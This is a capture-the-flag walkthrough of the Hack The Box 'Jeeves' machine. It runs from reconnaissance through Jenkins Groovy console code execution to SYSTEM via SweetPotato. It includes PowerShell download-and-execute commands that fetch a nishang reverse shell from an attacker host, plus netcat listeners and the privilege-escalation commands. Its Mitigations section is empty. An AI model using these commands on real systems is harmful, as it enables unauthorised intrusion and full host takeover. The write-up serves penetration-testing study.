
# Jeeves
- Walkthrough
- Mitigrations
- References


## Jeeves

The tester starteed with an nmap scan to enumerate the host.


```
└──╼ [★]$ nmap -sC -sV -p 80,135,445,50000 10.10.10.63
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-12 12:35 GMT
Nmap scan report for jeeves.htb (10.10.10.63)
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-12-12T17:35:46
|_  start_date: 2023-12-12T17:34:14
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m56s, deviation: 0s, median: 4h59m56s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.88 seconds

```

The scan showed that a web service was running on port 50000. The tester used ffuf to bruteforce the directories. 


```
└──╼ [★]$ ffuf -w '/home/rang3r/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt'  -u http://10.10.10.63:50000/FUZZ -e .txt,.asp,.aspx,.config,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.63:50000/FUZZ
 :: Wordlist         : FUZZ: /home/rang3r/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Extensions       : .txt .asp .aspx .config .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
    * FUZZ: askjeeves

:: Progress: [1245858/1245858] :: Job [1/1] :: 970 req/sec :: Duration: [0:23:13] :: Errors: 0 ::


```

The ffuf found the "askjeeves" directory. The endpoint is running the jenkins service. Jenkins has a script console that allows user to run "groovy" scripts on the server.


insert image of console---------------------


The tester used the following scipt to test code execution:

```
def process = "whoami".execute()
print "Output: " + process.text
print "Exit code: " + process.exitValue()
```

Which returned:

```
Result

Output: jeeves\kohsuke
Exit code: 0
```

The tester next gained a shell on the host by downloading and invoking a powershell shell. The Tester used the nishang tool set that contained a series of powershell shells. The tester set up a HTTP server using python and a Netcat listener then used the beolow script to download and run the shell.

```
def process = "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8083/Invoke-PowerShellTcp.ps1')".execute()
print "Output: " + process.text
print "Exit code: " + process.exitValue()
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8084
listening on [any] 8084 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.63] 49680
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins>hostname
Jeeves
PS C:\Users\Administrator\.jenkins> whoami
jeeves\kohsuke
PS C:\Users\Administrator\.jenkins> 
```

This gave access to the host as the "kohsuke" user. The tester checked the users privileges and found that the user had the SeImpersonatePrivilege privilege. This privilege allows a user to imperonate process tokens.


```
PS C:\Users\Administrator\.jenkins> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
PS C:\Users\Administrator\.jenkins> 
```

The tester used the "sweetpotato" binary to exploit this vulnerability and get system. The tester used another HTTP server to download the binary.


```
PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
```

```
┌──(kali㉿kali)-[~/…/tools/priv_esc/windows/binaries]
└─$ python -m http.server 8080                                
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.63 - - [23/Dec/2023 18:03:34] code 404, message File not found
10.10.10.63 - - [23/Dec/2023 18:03:34] "GET /sweetpotato.exe HTTP/1.1" 404 -
10.10.10.63 - - [23/Dec/2023 18:03:56] "GET /SweetPotato.exe HTTP/1.1" 200 -

```
Once the binary had been downloaded the tester tested the exploit by running the "whoami" command with it which return the system account. The tester used the same process used previouly to get get a system shell. 

```
PS C:\users\public\music> wget "http://10.10.14.8:8080/SweetPotato.exe" -outfile "/users/public/music/sweetpotato.exe"
PS C:\users\public\music> ./sweetpotato.exe -a whoami
Modifying SweetPotato by Uknow to support webshell
Github: https://github.com/uknowsec/SweetPotato 
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\Jeeves/pipe/1b14b892-4acd-461d-8f4d-30d7665e1b02
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c whoami 
[+] process with pid: 3212 created.

=====================================

nt authority\system


[+] Process created, enjoy!
PS C:\users\public\music> 

```
The tester ran the download and invoke command using the exploit binary which gave a system shell.
```
PS C:\users\public\music> ./sweetpotato.exe -a "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:8080/Invoke-PowerShellTcp.ps1')"  
```


```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8085        
listening on [any] 8085 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.63] 49688
Windows PowerShell running as user JEEVES$ on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> hostname
Jeeves
PS C:\Windows\system32> 
```


## Mitigations 

## References
https://github.com/uknowsec/SweetPotato
https://github.com/samratashok/nishang
